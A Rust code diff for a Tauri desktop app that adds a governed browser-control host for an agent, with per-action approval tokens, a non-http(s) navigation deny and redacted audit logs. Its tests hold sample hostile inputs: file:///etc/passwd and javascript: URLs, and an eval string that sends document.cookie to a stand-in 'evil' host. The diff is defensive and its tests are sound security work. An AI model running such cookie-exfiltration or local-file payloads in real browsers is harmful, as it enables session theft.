@@ -53,6 +53,12 @@ mod sandbox;
 // where the governance state is owned. See pty.rs.
 mod pty;
 
+// R6 Lane-C governed CDP browser host: the real BrowserDriver src/browser.ts
+// injects — an async Chrome DevTools Protocol client + the non-http(s) hard-deny
+// (`is_safe_http_url`) the host mirrors from governance.ts. The `#[tauri::command]`
+// wiring (token spend + connection registry + audit) lives below. See browser.rs.
+mod browser;
+
 /// Token bundle mirrored to the CLI's config field names ({token, refreshToken})
 /// so the two clients share one mental model. Serialized as camelCase so the
 /// JS store (store.ts) reads `token` / `refreshToken` directly.
@@ -625,6 +631,18 @@ fn classify(kind: &str, argv: &[String], path: Option<&str>) -> (&'static str, &
             }
         }
     }
+    // browser.navigate off http/https (file://, javascript:, data:, chrome://,
+    // about:…) would pivot a browser-control agent off the web into the local
+    // machine / the browser's internals — DENY, never surfaced for approval. The
+    // host-side mirror of governance.ts's browser.navigate hard-deny: LOAD-BEARING
+    // because in PRODUCTION createTauriGovernance delegates request() straight to
+    // THIS classify (the TS classifyAction runs only in the dev/test in-memory
+    // backend), so this is the sole classifier that sees a prod browser.navigate.
+    // request_action passes the navigate URL as `path` for this check (same
+    // convention as pty passing cwd as path).
+    if kind == "browser.navigate" && !browser::is_safe_http_url(path) {
+        return ("deny", "non-http(s) navigation blocked");
+    }
     // 2. Explicit auto-allow set (read-only / local-keyless only).
     if kind == "probe.detect" || kind == "local.dispatch" {
         return ("auto-allow", "read-only / local-keyless");
@@ -635,9 +653,22 @@ fn classify(kind: &str, argv: &[String], path: Option<&str>) -> (&'static str, &
     // here so it reports "side-effecting action", not "unknown action" (the
     // vendor/cwd/flag hard-denies live in the TS classifier + pty_spawn's own
     // resolution; classify only decides the auto-allow/approval split).
+    // browser.* (Lane-C governed CDP browser host) are EXPLICIT, reasoned-about
+    // side-effecting kinds — even a read observes a possibly-authenticated remote
+    // page. Listed here so they report "side-effecting action" (matching the TS
+    // classifyAction, which recognises them via isActionKind), not "unknown action".
     let known = matches!(
         kind,
-        "direct.dispatch" | "spawn.launch" | "command.run" | "mcp.tool" | "file.write" | "pty.spawn"
+        "direct.dispatch"
+            | "spawn.launch"
+            | "command.run"
+            | "mcp.tool"
+            | "file.write"
+            | "pty.spawn"
+            | "browser.navigate"
+            | "browser.read"
+            | "browser.interact"
+            | "browser.eval"
     );
     if known {
         ("require-approval", "side-effecting action")
@@ -1075,6 +1106,11 @@ fn request_action(app: AppHandle, gov: State<'_, Governance>, kind: String, deta
     // every other kind uses argv/path directly.
     let (decision, reason) = if kind == "pty.spawn" {
         classify(&kind, detail.args.as_deref().unwrap_or(&[]), detail.cwd.as_deref())
+    } else if kind == "browser.navigate" {
+        // browser.navigate's hard-deny is on the URL; classify reads it via `path`
+        // (same convention as pty passing its cwd as path). The token is still
+        // bound to the url through ActionDetail::binding, unaffected by this.
+        classify(&kind, &[], detail.url.as_deref())
     } else {
         classify(&kind, detail.argv.as_deref().unwrap_or(&[]), detail.path.as_deref())
     };
@@ -1739,6 +1775,287 @@ fn pty_resize(state: State<'_, pty::PtyHostState>, session_id: String, cols: u16
 #[tauri::command]
 fn pty_kill(state: State<'_, pty::PtyHostState>, session_id: String) -> Result<(), String> {
     state.kill(&session_id)
+}
+
+// ── Lane-C governed CDP browser host — the real driver src/browser.ts injects ──
+//
+// A webview cannot open a raw TCP/WebSocket to a browser's DevTools endpoint;
+// only the host can. So the CDP driver lives here: `browser_connect` opens one
+// page-target WebSocket, `browser_dispatch` drives navigate/read/interact/eval
+// through the SAME fail-closed gate as every other side effect, and
+// `browser_disconnect` tears it down. The security shape mirrors `governed_command`
+// / `pty_spawn`:
+//   * The non-http(s) navigation HARD-DENY is re-checked host-side BEFORE the token
+//     is spent (createTauriGovernance delegates request() to the Rust classify, so
+//     the TS isSafeHttpUrl never runs in prod — this is the real enforcement).
+//   * navigate/read/interact/eval each spend a one-time token bound EXACTLY as
+//     browserActionToGate minted it (navigate binds the url; the others bind no
+//     extra fields — the raw selector/value/js are NOT part of governance).
+//   * The audit line carries only the op (+ navigate url); the raw typed value (a
+//     possible password) and eval JS (arbitrary code) NEVER reach the ledger.
+
+/// Serde mirror of src/browser.ts `BrowserAction` (a tagged union on `op`). The
+/// raw `selector`/`value`/`js` fields reach the CDP DRIVER only — they never enter
+/// the governance detail or the audit ledger (the gate sees a length/preview via
+/// browserActionToGate; the driver spends the raw text separately).
+#[derive(Deserialize)]
+#[serde(rename_all = "camelCase")]
+struct BrowserActionInput {
+    op: String,
+    #[serde(default)]
+    url: Option<String>, // navigate
+    #[serde(default)]
+    what: Option<String>, // read: screenshot | dom | url
+    #[serde(default)]
+    kind: Option<String>, // interact: click | type | scroll | select
+    #[serde(default)]
+    selector: Option<String>, // interact
+    #[serde(default)]
+    value: Option<String>, // interact (RAW — driver only)
+    #[serde(default)]
+    js: Option<String>, // eval (RAW — driver only)
+}
+
+/// Mirror of src/browser.ts `BrowserResult` (camelCase → the webview reads it
+/// directly). `value` is the op's payload (navigate: final URL · read: data-uri /
+/// DOM / URL · interact: `{ok}` · eval: the JSON-able result).
+#[derive(Serialize)]
+#[serde(rename_all = "camelCase")]
+struct BrowserResult {
+    ok: bool,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    value: Option<serde_json::Value>,
+    #[serde(skip_serializing_if = "Option::is_none")]
+    error: Option<String>,
+}
+
+/// The host-owned CDP connection (at most one active session). Behind a std Mutex
+/// that is NEVER held across an await: `browser_dispatch` takes the connection OUT,
+/// drives it async, and puts it back — so there is no async-lock hazard, and a
+/// second concurrent dispatch simply finds no connection (the browser is a
+/// single-session surface).
+#[derive(Default)]
+struct BrowserHostState(Mutex<Option<browser::CdpConnection>>);
+
+/// op → governance ActionKind (mirror of src/browser.ts OP_KIND / opToKind).
+fn browser_op_to_kind(op: &str) -> Option<&'static str> {
+    match op {
+        "navigate" => Some("browser.navigate"),
+        "read" => Some("browser.read"),
+        "interact" => Some("browser.interact"),
+        "eval" => Some("browser.eval"),
+        _ => None,
+    }
+}
+
+/// The REDACTED audit summary for a browser action — op-scoped, carrying the
+/// navigate URL (audit_append's `redact` scrubs any secret-shaped token) but NEVER
+/// the raw typed value (a possible password) or eval JS (arbitrary code): a
+/// length / selector is the most it reveals. Mirrors browserActionToGate's redacted
+/// summary contract.
+fn browser_audit_summary(action: &BrowserActionInput) -> String {
+    match action.op.as_str() {
+        "navigate" => format!("browser navigate {}", action.url.as_deref().unwrap_or("")),
+        "read" => format!("browser read ({})", action.what.as_deref().unwrap_or("dom")),
+        "interact" => {
+            let ik = action.kind.as_deref().unwrap_or("");
+            let sel = action.selector.as_deref().unwrap_or("");
+            if ik == "type" {
+                // A typed value may be a password — show its LENGTH, never the text.
+                let n = action.value.as_deref().map(|v| v.chars().count()).unwrap_or(0);
+                format!("browser type {n} chars into {sel}")
+            } else {
+                format!("browser {ik} {sel}")
+            }
+        }
+        // eval JS is arbitrary code — length only, never the source.
+        "eval" => {
+            let n = action.js.as_deref().map(|s| s.chars().count()).unwrap_or(0);
+            format!("browser eval JS ({n} chars)")
+        }
+        _ => "browser action".to_string(),
+    }
+}
+
+/// Route an already-gated action to the CDP driver. Returns the op's value on a
+/// page-level result (Ok) or a transport/protocol failure (Err — the caller drops
+/// the session). The RAW selector/value/js are used HERE and never audited.
+async fn browser_drive(
+    conn: &mut browser::CdpConnection,
+    kind: &str,
+    action: &BrowserActionInput,
+) -> Result<serde_json::Value, String> {
+    match kind {
+        "browser.navigate" => {
+            let url = action.url.as_deref().ok_or("navigate requires a url")?;
+            Ok(serde_json::Value::String(conn.navigate(url).await?))
+        }
+        "browser.read" => match action.what.as_deref().unwrap_or("dom") {
+            "screenshot" => Ok(serde_json::Value::String(conn.screenshot().await?)),
+            "url" => Ok(serde_json::Value::String(conn.current_url().await?)),
+            _ => Ok(serde_json::Value::String(conn.dom().await?)), // "dom" default
+        },
+        "browser.interact" => {
+            let ikind = action.kind.as_deref().ok_or("interact requires a kind")?;
+            let selector = action.selector.as_deref().ok_or("interact requires a selector")?;
+            conn.interact(ikind, selector, action.value.as_deref()).await
+        }
+        "browser.eval" => {
+            let js = action.js.as_deref().ok_or("eval requires js")?;
+            conn.eval(js).await
+        }
+        _ => Err(format!("unhandled browser kind: {kind}")),
+    }
+}
+
+/// Discover a page target's WebSocket debugger URL from a loopback DevTools HTTP
+/// endpoint. Read-only discovery (loopback only) — NOT gated, like `mcp_list_tools`.
+#[tauri::command]
+async fn browser_discover(port: u16) -> Result<String, String> {
+    browser::discover_ws_endpoint(port).await
+}
+
+/// Open the single CDP page-target connection. Not per-se gated (per-action gates
+/// cover every side effect), but AUDITED, and restricted to a ws(s) endpoint so it
+/// can't be pointed at http/file/etc.
+#[tauri::command]
+async fn browser_connect(
+    app: AppHandle,
+    gov: State<'_, Governance>,
+    state: State<'_, BrowserHostState>,
+    cdp_url: String,
+    ts: Option<u64>,
+) -> Result<(), String> {
+    let ts = ts.unwrap_or(0);
+    let lower = cdp_url.trim().to_ascii_lowercase();
+    if !(lower.starts_with("ws://") || lower.starts_with("wss://")) {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "denied", "non-ws CDP endpoint blocked", ts);
+        }
+        return Err("CDP endpoint must be a ws:// or wss:// URL".into());
+    }
+    // Connect BEFORE taking the state lock (never hold a lock across an await).
+    let conn = browser::CdpConnection::connect(cdp_url.trim()).await?;
+    {
+        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
+        *guard = Some(conn);
+    }
+    if let Ok(mut gate) = gov.0.lock() {
+        audit_append(&app, &mut gate, "browser.connect", "-", "success", "browser connected", ts);
+    }
+    Ok(())
+}
+
+/// Drop the active CDP connection (dropping the socket closes it). Safe direction —
+/// no approval needed; audited when a live session was actually torn down.
+#[tauri::command]
+fn browser_disconnect(app: AppHandle, gov: State<'_, Governance>, state: State<'_, BrowserHostState>, ts: Option<u64>) -> Result<(), String> {
+    let ts = ts.unwrap_or(0);
+    let had = {
+        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
+        guard.take().is_some()
+    };
+    if had {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, "browser.connect", "-", "success", "browser disconnected", ts);
+        }
+    }
+    Ok(())
+}
+
+/// THE GOVERNED CDP DISPATCH. Spends a one-time `browser.*` token BEFORE the driver
+/// touches the page — a webview cannot forge a host token, so no action runs without
+/// passing the gate. Order is security-critical (mirrors pty_spawn): the non-http(s)
+/// hard-deny is checked BEFORE the token is spent, and a missing connection / bad
+/// token never leaks a session or burns a token.
+#[tauri::command]
+async fn browser_dispatch(
+    app: AppHandle,
+    gov: State<'_, Governance>,
+    state: State<'_, BrowserHostState>,
+    token: String,
+    action: BrowserActionInput,
+    ts: Option<u64>,
+) -> Result<BrowserResult, String> {
+    let ts = ts.unwrap_or(0);
+
+    let kind = match browser_op_to_kind(action.op.trim()) {
+        Some(k) => k,
+        None => {
+            if let Ok(mut gate) = gov.0.lock() {
+                audit_append(&app, &mut gate, "browser.dispatch", "-", "error", "unknown browser op", ts);
+            }
+            return Err(format!("unknown browser op: {}", action.op));
+        }
+    };
+
+    // Shared audit helper (best-effort — an audit miss must never crash a decision).
+    let audit_browser = |outcome: &str, summary: &str| {
+        if let Ok(mut gate) = gov.0.lock() {
+            audit_append(&app, &mut gate, kind, "-", outcome, summary, ts);
+        }
+    };
+
+    // ── HOST-side HARD-DENY — before the token is spent ──
+    // navigate off http/https would pivot the agent off the web into the local
+    // machine / the browser's internals. LOAD-BEARING: prod request() delegates to
+    // the Rust classify, so the TS isSafeHttpUrl never runs there — this is the real
+    // gate (the pty dangerous-flag lesson). A policy deny NEVER touches the token.
+    if kind == "browser.navigate" && !browser::is_safe_http_url(action.url.as_deref()) {
+        audit_browser("denied", "non-http(s) navigation blocked");
+        return Err("non-http(s) navigation blocked".into());
+    }
+
+    // Take the connection OUT first — a missing connection must NOT burn the token.
+    let mut conn = {
+        let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
+        match guard.take() {
+            Some(c) => c,
+            None => return Err("no active browser connection (call browser_connect first)".into()),
+        }
+    };
+
+    // Spend the one-time token, bound EXACTLY as browserActionToGate minted it:
+    // navigate binds the url; read/interact/eval bind no extra fields.
+    let detail = if kind == "browser.navigate" {
+        ActionDetail { url: action.url.clone(), ..Default::default() }
+    } else {
+        ActionDetail::default()
+    };
+    let binding = detail.binding(kind);
+    {
+        let mut gate = gov.0.lock().map_err(|_| "browser state poisoned")?;
+        if !try_consume_token(&mut gate, &token, kind, &binding) {
+            audit_append(&app, &mut gate, kind, "-", "replay-rejected", kind, ts);
+            drop(gate);
+            // A bad token must not drop a live session — put the connection back.
+            let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
+            *guard = Some(conn);
+            return Err("invalid or already-spent token".into());
+        }
+    }
+
+    // consumed audit — op-scoped, REDACTED, never the raw value/js.
+    audit_browser("consumed", &browser_audit_summary(&action));
+
+    // Drive the page. A transport/protocol failure (Err) invalidates the session →
+    // the connection is DROPPED here (forcing a reconnect); a page-level result (Ok)
+    // — including a driver `{ok:false, error}` — keeps the session alive → put it back.
+    match browser_drive(&mut conn, kind, &action).await {
+        Ok(value) => {
+            {
+                let mut guard = state.0.lock().map_err(|_| "browser state poisoned")?;
+                *guard = Some(conn);
+            }
+            audit_browser("success", &browser_audit_summary(&action));
+            Ok(BrowserResult { ok: true, value: Some(value), error: None })
+        }
+        Err(e) => {
+            // conn dropped (not put back) — a broken session forces a fresh connect.
+            audit_browser("error", "browser action failed");
+            Ok(BrowserResult { ok: false, value: None, error: Some(e) })
+        }
+    }
 }
 
 // ── MCP client — stdio JSON-RPC 2.0, spawned + framed HERE in the host ─────────
@@ -2754,6 +3071,94 @@ mod governance_tests {
         assert!(t2.contains("Args:"), "dialog must surface the Args line");
         assert!(t2.contains("--dangerously-skip"), "dialog must show the real flags");
     }
+
+    // ── R6 Lane-C browser host: classify + the url-bound token / hard-deny ──
+
+    #[test]
+    fn classify_browser_navigate_denies_non_http() {
+        // request_action passes the navigate URL as `path`. Non-http(s) schemes are
+        // a hard DENY (never surfaced to the native dialog) — the host mirror of
+        // governance.ts's browser.navigate hard-deny, the SOLE classifier a prod
+        // navigate sees (createTauriGovernance delegates request() to Rust classify).
+        assert_eq!(classify("browser.navigate", &[], Some("file:///etc/passwd")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("javascript:alert(1)")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("data:text/html,x")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("chrome://settings")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], Some("about:blank")).0, "deny");
+        assert_eq!(classify("browser.navigate", &[], None).0, "deny"); // no url → fail-closed
+        // An http/https navigation is NOT denied — it requires approval.
+        let (d, r) = classify("browser.navigate", &[], Some("https://example.com"));
+        assert_eq!(d, "require-approval");
+        assert_eq!(r, "side-effecting action");
+    }
+
+    #[test]
+    fn classify_browser_read_interact_eval_are_known_require_approval() {
+        // Even a read observes a possibly-authenticated remote page — all default to
+        // require-approval, and must report as a REASONED-ABOUT side-effecting kind
+        // (parity with governance.ts, where isActionKind recognises them), never the
+        // "unknown action (fail-closed)" branch.
+        for kind in ["browser.read", "browser.interact", "browser.eval"] {
+            let (d, r) = classify(kind, &[], None);
+            assert_eq!(d, "require-approval", "{kind}");
+            assert_eq!(r, "side-effecting action", "{kind}");
+            assert_ne!(r, "unknown action (fail-closed)", "{kind}");
+        }
+    }
+
+    #[test]
+    fn browser_dispatch_binding_matches_browser_action_to_gate() {
+        // navigate binds its EXACT url (a bank.com approval can't drive evil.com);
+        // read/interact/eval bind NO extra fields (the raw selector/value/js are not
+        // part of governance) — so their binding is the bare kind, matching the TS
+        // browserActionToGate + bindingKey (which set only `summary`, never bound).
+        let bank = ActionDetail { url: Some("https://bank.com".into()), ..Default::default() };
+        let evil = ActionDetail { url: Some("https://evil.com".into()), ..Default::default() };
+        assert_ne!(bank.binding("browser.navigate"), evil.binding("browser.navigate"));
+
+        // A token minted for navigate(bank.com) cannot be spent to reach evil.com.
+        let mut gate = GateState::default();
+        seed_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate"));
+        assert!(!try_consume_token(&mut gate, "tok-nav", "browser.navigate", &evil.binding("browser.navigate")));
+        assert!(try_consume_token(&mut gate, "tok-nav", "browser.navigate", &bank.binding("browser.navigate")));
+
+        // read/interact/eval bind identically to the default (all fields null).
+        let empty = ActionDetail::default();
+        assert_eq!(empty.binding("browser.read"), ActionDetail::default().binding("browser.read"));
+        assert_eq!(empty.binding("browser.eval"), ActionDetail::default().binding("browser.eval"));
+    }
+
+    #[test]
+    fn browser_audit_summary_never_leaks_typed_value_or_eval_js() {
+        // The typed value (a possible password) and eval JS (arbitrary code) must
+        // never reach the ledger — only a length/selector does.
+        let typed = BrowserActionInput {
+            op: "interact".into(),
+            kind: Some("type".into()),
+            selector: Some("#password".into()),
+            value: Some("hunter2-supersecret".into()),
+            url: None,
+            what: None,
+            js: None,
+        };
+        let s = browser_audit_summary(&typed);
+        assert!(s.contains("#password"), "selector is shown");
+        assert!(s.contains("19 chars"), "value length is shown");
+        assert!(!s.contains("hunter2"), "the raw typed value must NEVER appear: {s}");
+
+        let evaled = BrowserActionInput {
+            op: "eval".into(),
+            js: Some("fetch('https://evil/'+document.cookie)".into()),
+            url: None,
+            what: None,
+            kind: None,
+            selector: None,
+            value: None,
+        };
+        let e = browser_audit_summary(&evaled);
+        assert!(e.contains("chars"), "eval shows a length");
+        assert!(!e.contains("document.cookie"), "the raw eval JS must NEVER appear: {e}");
+    }
 }
 
 #[cfg_attr(mobile, tauri::mobile_entry_point)]
@@ -2762,6 +3167,7 @@ pub fn run() {
         .plugin(tauri_plugin_dialog::init()) // S-012 native approval dialog
         .manage(Governance(Mutex::new(GateState::default())))
         .manage(pty::PtyHostState::default()) // R6 Lane-B real-PTY session registry
+        .manage(BrowserHostState::default()) // R6 Lane-C governed CDP browser connection
         .invoke_handler(tauri::generate_handler![
             secure_store_get,
             secure_store_set,
@@ -2783,6 +3189,10 @@ pub fn run() {
             pty_write,
             pty_resize,
             pty_kill,
+            browser_discover,
+            browser_connect,
+            browser_disconnect,
+            browser_dispatch,
             mcp_list_servers,
             mcp_add_server,
             mcp_remove_server,
